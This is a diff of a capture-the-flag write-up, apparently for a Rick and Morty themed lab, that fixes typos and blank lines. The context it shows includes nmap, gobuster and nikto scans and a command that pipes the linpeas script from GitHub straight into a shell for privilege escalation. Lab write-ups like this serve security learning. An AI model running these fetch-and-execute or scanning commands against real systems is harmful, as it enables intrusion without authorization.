@@ -30,13 +30,11 @@ zsh: segmentation fault  nmap -sC -sV -oN nmap/initial 10.10.115.151
 # Task 1
 
 ```
-
 1. What is the first ingredient rick needs? mr. meeseek hair
 
 2. Whats the second ingredient rick needs? 1 jerry tear
 
-3. Whats the final ingredient rick nneds? fleeb juice
-
+3. Whats the final ingredient rick needs? fleeb juice
 ````
 
 # Website
@@ -65,16 +63,12 @@ call_cmd "export TERM=xterm"
 curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
 
 sudo -i "no password required"
-
-
 ```
 
 # Gobuster
 
 ```
 gobuster dir -u http://$IP -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,js,css,py -z
-
-
 ```
 
 # Nikto
@@ -102,7 +96,6 @@ nikto -h http://$IP | tee nikto.log
 + /login.php: Admin login page/section found.
 + 7889 requests: 0 error(s) and 9 item(s) reported on remote host
 + End Time:           2022-09-24 19:42:32 (GMT1) (306 seconds)
-
 ```
 
 # Complete
